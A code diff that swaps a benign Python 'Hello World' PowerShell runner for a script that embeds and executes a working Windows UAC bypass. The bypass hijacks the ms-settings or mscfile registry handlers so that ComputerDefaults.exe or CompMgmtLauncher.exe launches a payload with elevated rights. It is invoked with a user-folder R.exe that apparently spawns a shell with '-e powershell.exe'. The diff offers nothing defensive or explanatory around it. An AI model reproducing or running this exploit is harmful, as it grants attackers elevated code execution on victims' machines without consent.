@@ -1,14 +1,60 @@
-import subprocess
+import subprocess, sys
+from io import StringIO
 
-def run(cmd):
-    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
-    return completed
+code ='''
+function Insomnia{
+	[CmdletBinding()]
+	param([string]$payload='powershell.exe')
 
-hello_command = """mkdir C:\\d
-Write-Host 'Hello Wolrd!'"""
-hello_info = run(hello_command)
+    #Get Windows Version
+    $ver = [System.Environment]::OSVersion.Version.Major
 
-if hello_info.returncode != 0:
-    print(f"Error - {hello_info.stderr}")
-else:
-    print("Executed successfully!")
+	#Get UAC Level
+	$key = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+	$uac = Get-ItemPropertyValue -Path $key -Name ConsentPromptBehaviorAdmin
+
+	function Add-RegKey([string]$key, [string]$exploit, [string]$payload='powershell.exe'){
+		$regPath = "HKCU:\Software\Classes\$key\shell\open\command"
+		New-Item $regPath -Force
+		New-ItemProperty $regPath -Name "DelegateExecute" -Value $null -Force
+		Set-ItemProperty $regPath -Name "(default)" -Value $payload -Force
+		Start-Process $exploit
+		Start-Sleep -s 5
+		Remove-Item $regPath -Force -Recurse
+	}
+
+	if ($uac -eq 2) {
+		$UAC_LEVEL = 'High'
+	} elseif ($uac -eq 0) {
+		$UAC_LEVEL = 'None'
+	} elseif ($uac -eq 5) {
+		$UAC_LEVEL = 'Default'
+	} else {
+		$UAC_LEVEL = 'Unknown'
+	}
+
+	if ($UAC_LEVEL -eq "High") {
+		exit
+	} elseif ($UAC_LEVEL -eq "None") {
+		Start-Process -FilePath $payload -verb runas
+	} else {
+		if ($ver -eq 10) {
+			Add-RegKey ms-settings ComputerDefaults.exe $payload
+		} else {
+			Add-RegKey mscfile CompMgmtLauncher.exe $payload
+		}
+	}
+}
+Insomnia "C:\Users\$env:username\R.exe -e powershell.exe"
+'''
+
+file = StringIO(code)
+
+p = subprocess.Popen(["powershell.exe", 
+              code], 
+              stdout=sys.stdout)
+p_out, p_err = p.communicate()
+
+print(p_out)
+
+
